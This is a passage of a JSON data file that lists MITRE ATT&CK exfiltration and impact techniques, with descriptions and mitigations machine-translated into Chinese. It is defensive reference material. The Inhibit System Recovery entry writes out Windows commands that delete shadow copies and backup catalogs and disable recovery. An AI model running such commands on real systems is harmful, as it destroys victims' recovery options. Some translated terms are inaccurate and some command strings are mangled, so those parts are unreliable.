        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [
            {
                "id": "T1020.001",
                "name": "Traffic Duplication"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会在收集过程中收集数据后，通过使用自动处理来过滤数据，如敏感文件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当使用自动外过滤时，其他外过滤技术也可能适用于将信息传输出网络，如C2通道外过滤和替代协议外过滤。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1030",
        "name": "Data Transfer Size Limits",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以以固定大小的块而不是整个文件来过滤数据，或者将数据包大小限制在特定阈值以下。此方法可用于避免触发网络数据传输阈值警报。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手指挥控制基础设施和恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1048",
        "name": "Exfiltration Over Alternative Protocol",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [
            {
                "id": "T1048.001",
                "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
            },
            {
                "id": "T1048.002",
                "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
            },
            {
                "id": "T1048.003",
                "name": "Exfiltration Over Unencrypted Non-C2 Protocol"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以通过与现有命令和控制信道不同的协议过滤数据来窃取数据。数据也可以从主命令和控制服务器发送到替代网络位置。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "替代协议包括FTP、SMTP、HTTP/S、DNS、SMB或任何其他未用作主要命令和控制通道的网络协议。对手也可以选择加密和/或混淆这些备用通道。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过替代协议的Exfiltering可以使用各种常见的操作系统实用程序（如Net/SMB或FTP）来完成。在macOS和Linux上，curl</code>可用于调用HTTP/S或FTP/S等协议，以从系统中过滤数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "许多IaaS和SaaS平台（如Microsoft Exchange、Microsoft SharePoint、GitHub和AWS S3）支持通过web控制台或Cloud API直接下载文件、电子邮件、源代码和其他敏感信息。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1057",
                "name": "数据丢失预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止数据丢失可以检测并阻止通过网络浏览器上传的敏感数据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "强制执行代理并使用DNS等服务的专用服务器，并且仅允许这些系统通过各自的端口/协议进行通信，而不是通过网络中的所有系统进行通信。云服务提供商在访问云资源时支持基于IP的限制。考虑将IP allowlisting与用户帐户管理一起使用，以确保数据访问不仅限于有效用户，而且仅限于预期的IP范围，从而减少使用被盗凭据访问数据的情况。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手指挥控制基础设施和恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "遵循网络防火墙配置的最佳实践，只允许必要的端口和流量进出网络。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在云存储系统和对象上使用访问控制列表。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置访问云存储的用户权限组和角色。实施严格的身份和访问管理（IAM）控制，以防止访问存储解决方案（需要访问的应用程序、用户和服务除外）。确保颁发临时访问令牌，而不是永久凭据，尤其是在将访问权限授予内部安全边界之外的实体时。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1041",
        "name": "Exfiltration Over C2 Channel",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以通过现有的指挥和控制通道过滤数据来窃取数据。使用与命令和控制通信相同的协议，将被盗数据编码到正常通信信道中。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1057",
                "name": "数据丢失预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止数据丢失可以检测并阻止通过未加密协议发送的敏感数据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于特定对手或工具使用的特定模糊技术，并且可能在各种恶意软件系列和版本中有所不同。随着时间的推移，敌人可能会改变工具的命令和控制特征，或者以避免被常见防御工具检测的方式构建协议。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1011",
        "name": "Exfiltration Over Other Network Medium",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [
            {
                "id": "T1011.001",
                "name": "Exfiltration Over Bluetooth"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图通过与命令和控制信道不同的网络介质来过滤数据。如果命令和控制网络是有线互联网连接，则例如可以通过WiFi连接、调制解调器、蜂窝数据连接、蓝牙或另一射频（RF）信道进行过滤。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果敌人有足够的访问权限或距离，他们可能会选择这样做，并且连接可能不会像主要的互联网连接通道那样安全或防御，因为它不是通过同一个企业网络路由的。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在本地计算机安全设置中禁用WiFi连接、调制解调器、蜂窝数据连接、蓝牙或其他射频（RF）信道，如果在环境中不需要，则通过组策略禁用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能防止创建新的网络适配器。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1052",
        "name": "Exfiltration Over Physical Medium",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [
            {
                "id": "T1052.001",
                "name": "Exfiltration over USB"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图通过物理介质（如可移动驱动器）泄露数据。在某些情况下，例如气隙网络折衷，可能通过用户引入的物理介质或设备进行过滤。这样的介质可以是外部硬盘驱动器、USB驱动器、蜂窝电话、MP3播放器或其他可移动存储和处理设备。物理介质或设备可以用作最终的外过滤点，或者在其他断开连接的系统之间跳跃。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1057",
                "name": "数据丢失预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止数据丢失可以检测并阻止复制到物理介质的敏感数据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不需要，请禁用“自动运行”。如果业务运营不需要可移动媒体，则在组织策略级别上禁止或限制可移动媒体。"
                        }
                    ]
                ]
            },
            {
                "id": "M1034",
                "name": "限制硬件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制在网络中使用USB设备和可移动媒体。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1567",
        "name": "Exfiltration Over Web Service",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [
            {
                "id": "T1567.001",
                "name": "Exfiltration to Code Repository"
            },
            {
                "id": "T1567.002",
                "name": "Exfiltration to Cloud Storage"
            },
            {
                "id": "T1567.003",
                "name": "Exfiltration to Text Storage Sites"
            },
            {
                "id": "T1567.004",
                "name": "Exfiltration Over Webhook"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会使用现有的合法外部Web服务来过滤数据，而不是他们的主要指挥和控制渠道。由于网络中的主机在妥协之前就已经在与它们通信，因此充当过滤机制的流行Web服务可能会提供大量的保护。防火墙规则也可能已经存在，以允许这些服务的流量。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "网络服务提供商通常也使用SSL/TLS加密，为对手提供了更高级别的保护。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1057",
                "name": "数据丢失预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "数据丢失预防可以检测并阻止通过web浏览器上传到web服务的敏感数据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "Web代理可用于强制执行外部网络通信策略，以防止使用未经授权的外部服务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1029",
        "name": "Scheduled Transfer",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会安排数据泄露仅在一天中的特定时间或特定间隔进行。这样做可以将流量模式与正常活动或可用性相结合。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当使用定时exfiltering时，其他exfilteringTechniques也可能适用于将信息传输出网络，例如通过C2信道的Exfiltering或通过替代协议的exfiltration。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手指挥控制基础设施和恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于特定对手或工具使用的特定模糊技术，并且可能在各种恶意软件系列和版本中有所不同。随着时间的推移，敌人可能会改变工具的命令和控制特征，或者以避免被常见防御工具检测的方式构建协议。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1537",
        "name": "Transfer Data to Cloud Account",
        "tactics": [
            {
                "id": "TA0010",
                "name": "Exfiltration"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以通过将数据（包括云环境的备份）传输到他们在同一服务上控制的另一个云帐户来过滤数据，以避免典型的文件传输/下载和基于网络的过滤检测。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过正常文件传输或通过命令和控制渠道监控到云环境外部的大额传输的防御者可能没有监控到同一云提供商内另一个帐户的数据传输。这样的传输可以利用现有的云提供商API和云提供商的内部地址空间来混合到正常流量中，或者避免通过外部网络接口进行数据传输。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "已经观察到对手创建云实例备份并将其转移到不同帐户的事件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "实施基于网络的过滤限制，以禁止向不受信任的VPC传输数据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑在一定的天数内轮换访问密钥，以降低被盗凭据的有效性。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将用户帐户和IAM策略限制为所需的最低权限。考虑对仅在特定时间段内有效的帐户使用临时凭据，以降低受损帐户的有效性。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1531",
        "name": "Account Access Removal",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会通过禁止访问合法用户使用的帐户来中断系统和网络资源的可用性。可以删除、锁定或操纵帐户（例如：更改的凭据）以删除对帐户的访问权限。敌人也可能随后注销和/或执行系统关闭/重新启动以设置恶意更改。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Windows的Net实用程序中，"
                },
                {
                    "type": "code",
                    "content": "Set LocalUser"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "Set-ADAccountPassword"
                },
                {
                    "type": "text",
                    "content": "PowerShell cmdlet可能被对手用来修改用户帐户。在Linux中，"
                },
                {
                    "type": "code",
                    "content": "passwd"
                },
                {
                    "type": "text",
                    "content": "实用程序可用于更改密码。组策略也可以禁用帐户。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "使用勒索软件或类似攻击的对手可能会在完成“为影响加密数据”目标之前，首先执行此行为和其他影响行为，如数据破坏和破坏，以阻碍事件响应/恢复。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1485",
        "name": "Data Destruction",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会破坏特定系统上或网络上的大量数据和文件，从而中断系统、服务和网络资源的可用性。数据销毁可能会通过覆盖本地和远程驱动器上的文件或数据，使存储的数据无法通过取证技术恢复。常见的操作系统文件删除命令，如"
                },
                {
                    "type": "code",
                    "content": "del"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "rm"
                },
                {
                    "type": "text",
                    "content": "，通常只删除指向文件的指针，而不擦除文件本身的内容，从而使文件可以通过适当的取证方法恢复。此行为与“磁盘内容擦除”和“磁盘结构擦除”不同，因为销毁的是单个文件，而不是存储磁盘的部分或磁盘的逻辑结构。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能试图用随机生成的数据覆盖文件和目录，使其无法恢复。在某些情况下，以政治为导向的图像文件已被用于覆盖数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "为了在以网络范围的可用性中断为目标的操作中最大限度地影响目标组织，设计用于销毁数据的恶意软件可能具有类似蠕虫的功能，可以通过利用有效帐户、操作系统凭据转储和SMB/Windows管理共享等附加技术在网络上传播。。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在云环境中，对手可能会利用访问权限删除云存储、云存储帐户、机器映像和其他对运营至关重要的基础设施，从而损害组织或其客户。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1053",
                "name": "数据备份",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实施IT灾难恢复计划，其中包含可用于恢复组织数据的定期数据备份过程。确保备份存储在系统外，并受到保护，不受对手可能用来访问和销毁备份以防止恢复的常见方法的影响。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1486",
        "name": "Data Encrypted for Impact",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以加密目标系统上或网络中大量系统上的数据，以中断系统和网络资源的可用性。他们可以通过加密本地和远程驱动器上的文件或数据并拒绝访问解密密钥，试图使存储的数据无法访问。这样做可能是为了从受害者那里获得金钱补偿，以换取解密或解密密钥（勒索软件），或者在密钥未被保存或传输的情况下使数据永久无法访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在勒索软件的情况下，常见的用户文件（如Office文档、PDF、图像、视频、音频、文本和源代码文件）通常会被加密（通常会被重命名和/或使用特定的文件标记进行标记）。敌人可能需要首先采用其他行为，如文件和目录权限修改或系统关闭/重新启动，以便解锁和/或获得操作这些文件的访问权限。在某些情况下，对手可能会对关键系统文件、磁盘分区和MBR进行加密。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "为了最大限度地影响目标组织，设计用于加密数据的恶意软件可能具有类似蠕虫的功能，通过利用其他攻击技术（如有效帐户、操作系统凭据转储和SMB/Windows管理共享）在网络上传播。加密恶意软件还可能利用内部诽谤，如更改受害者壁纸，或通过向连接的打印机发送赎金通知或其他信息来恐吓受害者（称为“打印轰炸”）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在云环境中，受损帐户中的存储对象也可能被加密。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用云提供的保护和减少攻击面（ASR）规则，以阻止类似勒索软件的文件的执行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1053",
                "name": "数据备份",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实施IT灾难恢复计划，其中包含定期进行和测试可用于恢复组织数据的数据备份的过程。确保备份存储在系统外，并受到保护，不受对手可能用来访问和销毁备份以防止恢复的常见方法的影响。考虑在云环境中启用版本控制，以维护存储对象的备份副本。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1565",
        "name": "Data Manipulation",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [
            {
                "id": "T1565.001",
                "name": "Stored Data Manipulation"
            },
            {
                "id": "T1565.002",
                "name": "Transmitted Data Manipulation"
            },
            {
                "id": "T1565.003",
                "name": "Runtime Data Manipulation"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能插入、删除或操纵数据，以影响外部结果或隐藏活动，从而威胁数据的完整性。通过操纵数据，对手可能试图影响业务流程、组织理解或决策。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "修改的类型及其影响取决于目标应用程序和过程以及对手的目标和目的。对于复杂的系统，对手可能需要特殊的专业知识，并可能访问与系统相关的专门软件，这些软件通常是通过长期的信息收集活动获得的，以产生预期的影响。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑加密重要信息，以降低对手执行定制数据修改的能力。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "识别可能被对手盯上的关键业务和系统流程，并努力隔离和保护这些系统免受未经授权的访问和篡改。"
                        }
                    ]
                ]
            },
            {
                "id": "M1029",
                "name": "远程数据存储",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实施IT灾难恢复计划，其中包含可用于恢复组织数据的定期数据备份过程。确保备份存储在系统外，并受到保护，不受对手可能用来访问和操作备份的常见方法的影响。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保将最低特权原则应用于重要信息资源，以减少数据操作风险。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1491",
        "name": "Defacement",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [
            {
                "id": "T1491.001",
                "name": "Internal Defacement"
            },
            {
                "id": "T1491.002",
                "name": "External Defacement"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会修改企业网络内部或外部可用的视觉内容，从而影响原始内容的完整性。诽谤的原因包括传递信息、恐吓或声称（可能是虚假的）入侵信用。干扰性或攻击性图像可能被用作Defacement的一部分，以引起用户的不适，或迫使用户遵守附带的消息。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1053",
                "name": "数据备份",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实施IT灾难恢复计划，其中包含可用于恢复组织数据的定期数据备份过程。确保备份存储在系统外，并受到保护，不受对手可能用来访问和销毁备份以防止恢复的常见方法的影响。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1561",
        "name": "Disk Wipe",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [
            {
                "id": "T1561.001",
                "name": "Disk Content Wipe"
            },
            {
                "id": "T1561.002",
                "name": "Disk Structure Wipe"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会擦除或损坏特定系统上或网络中大量的原始磁盘数据，从而中断系统和网络资源的可用性。通过对磁盘的直接写入访问，对手可能会试图覆盖部分磁盘数据。对手可以选择擦除磁盘数据的任意部分和/或擦除主引导记录（MBR）等磁盘结构。可以尝试完全擦除所有磁盘扇区。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "为了在以网络范围可用性中断为目标的操作中最大限度地影响目标组织，用于擦除磁盘的恶意软件可能具有类似蠕虫的功能，通过利用有效帐户、操作系统凭据转储和SMB/Windows管理共享等附加技术在网络中传播。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，对手可能会使用网络设备CLI命令（如"
                },
                {
                    "type": "code",
                    "content": "erase"
                },
                {
                    "type": "text",
                    "content": "）从设备中擦除配置文件和其他数据。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1053",
                "name": "数据备份",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实施IT灾难恢复计划，其中包含可用于恢复组织数据的定期数据备份过程。确保备份存储在系统外，并受到保护，不受对手可能用来访问和销毁备份以防止恢复的常见方法的影响。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1499",
        "name": "Endpoint Denial of Service",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [
            {
                "id": "T1499.001",
                "name": "OS Exhaustion Flood"
            },
            {
                "id": "T1499.002",
                "name": "Service Exhaustion Flood"
            },
            {
                "id": "T1499.003",
                "name": "Application Exhaustion Flood"
            },
            {
                "id": "T1499.004",
                "name": "Application or System Exploitation"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会执行端点拒绝服务（DoS）攻击，以降低或阻止用户获得服务。端点DoS可以通过耗尽这些服务所在的系统资源或利用系统造成持续崩溃来执行。示例服务包括网站、电子邮件服务、DNS和基于web的应用程序。据观察，敌人出于政治目的进行DoS攻击，并支持其他恶意活动，包括分散注意力、黑客活动和勒索。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "Endpoint DoS拒绝服务的可用性，而不会使用于提供服务访问的网络饱和。对抗可以针对托管在用于提供服务的系统上的应用程序堆栈的各个层。这些层包括操作系统（OS）、服务器应用程序（如web服务器、DNS服务器、数据库）以及位于它们之上的（通常是基于web的）应用程序。攻击每一层都需要不同的技术来利用各个组件特有的瓶颈。DoS攻击可能由分布在互联网上的单个系统或多个系统产生，通常称为分布式DoS（DDoS）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "要对端点资源执行DoS攻击，有几个方面适用于多种方法，包括IP地址欺骗和僵尸网络。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能使用攻击系统的原始IP地址，或伪造源IP地址，使攻击流量更难追溯到攻击系统或进行反射。这会降低或消除网络防御设备上源地址过滤的有效性，从而增加防御者抵御攻击的难度。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "僵尸网络通常用于对网络和服务进行DDoS攻击。大型僵尸网络可以从遍布全球互联网的系统中产生大量流量。敌人可能有资源建立和控制自己的僵尸网络基础设施，或者可能在现有的僵尸网络上租用时间进行攻击。在DDoS最糟糕的一些情况下，许多系统被用来生成请求，每个系统只需要发送少量流量，就可以产生足够的流量来耗尽目标的资源。在这种情况下，区分DDoS流量和合法客户端变得极其困难。僵尸网络已被用于一些最引人注目的DDoS攻击，例如2012年针对美国主要银行的一系列事件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在使用流量操纵的情况下，在全球网络（如高流量网关路由器）中可能存在数据包可以被更改的点，并导致合法客户端执行代码，将网络数据包指向大容量的目标。这种类型的功能以前用于网络审查，其中客户端HTTP流量被修改为包括对生成DDoS代码以压倒目标网络服务器的JavaScript的引用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有关试图使提供网络饱和的攻击，请参阅网络拒绝服务。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "利用内容交付网络（CDN）或专门从事DoS缓解的提供商提供的服务来过滤服务上游的流量。通过阻止来源于攻击的源地址、阻止作为目标的端口或阻止用于传输的协议来过滤边界流量。要防御SYN洪水，请启用SYN Cookies。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1657",
        "name": "Financial Theft",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能通过勒索、社会工程、技术盗窃或其他旨在获取自身经济利益的方法，以牺牲受害者获得这些资源为代价，从目标那里窃取货币资源。金融盗窃是几种流行的活动类型的最终目标，包括勒索软件勒索、商业电子邮件泄露（BEC）和欺诈、“杀猪”、银行黑客攻击和利用加密货币网络。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会破坏账户进行未经授权的资金转移。在商业电子邮件泄露或电子邮件欺诈的情况下，对手可能会利用假冒可信实体的行为。一旦社会工程成功，受害者可能会被欺骗，向对手控制的金融账户汇款。这就造成了金融盗窃事件中多个受害者（即账户受损以及最终的金钱损失）的可能性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，当对手在对数据进行影响加密和数据过滤后要求受害者付款，然后威胁公众曝光，除非向对手付款时，可能会发生勒索软件勒索。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于金融盗窃对业务的潜在巨大影响，对手可能会滥用金融盗窃的可能性并寻求金钱利益，以转移人们对其真实目标（如数据破坏和业务中断）的注意力。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制执行敏感交易的访问权限，并切换到旨在验证/批准电子邮件等不安全通信线路之外的付款和购买请求的系统和程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "培训和测试用户，以识别用于实现金融盗窃的社会工程技术。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1495",
        "name": "Firmware Corruption",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会覆盖或损坏系统BIOS或连接到系统的设备中的其他固件的闪存内容，从而使其无法操作或无法启动，从而拒绝使用设备和/或系统。固件是从硬件设备上的非易失性存储器加载和执行的软件，用于初始化和管理设备功能。这些设备可能包括主板、硬盘驱动器或视频卡。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "一般来说，对手可能会操纵、重写或损坏固件，以拒绝使用系统或设备。例如，负责为网络设备加载操作系统的固件的损坏可能导致网络设备不可操作。根据设备的不同，此攻击还可能导致数据破坏。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1046",
                "name": "引导完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "检查现有BIOS和设备固件的完整性，以确定其是否容易被修改。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止对手访问特权帐户或更换系统固件所需的访问权限。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据需要修补BIOS和其他固件，以防止成功使用已知漏洞。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1490",
        "name": "Inhibit System Recovery",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会删除或删除内置数据，并关闭旨在帮助恢复损坏系统的服务，以阻止恢复。这可能会拒绝访问可用的备份和恢复选项。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "操作系统可能包含有助于修复损坏系统的功能，如备份目录、卷影副本和自动修复功能。敌人可能会禁用或删除系统恢复功能，以增强数据破坏和数据加密的影响。此外，对手可能会禁用恢复通知，然后破坏备份。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "许多本机Windows实用程序已被对手用来禁用或删除系统恢复功能："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "vssadmin.exe可用于删除系统上的所有卷影副本-vsadmin.exe delete shadows/all/quiet"
                },
                {
                    "type": "list",
                    "content": "Windows Management Instrumentation可用于删除卷影副本-wmic卷影副本删除"
                },
                {
                    "type": "list",
                    "content": "wbadmin.exe可用于删除Windows备份目录-wbadmin.exe删除目录-quiet"
                },
                {
                    "type": "list",
                    "content": "bcdedit.exe可用于通过修改启动配置数据来禁用Windows自动恢复功能-bcdedit.exe/set｛default｝bootstatuspolicy ignorealfailures&bcdedit/set{default｝recoveryenabled no"
                },
                {
                    "type": "list",
                    "content": "REAgentC.exe可用于禁用受感染系统的Windows恢复环境（WinRE）修复/恢复选项"
                }
            ],
            [
                {
                    "type": "text",
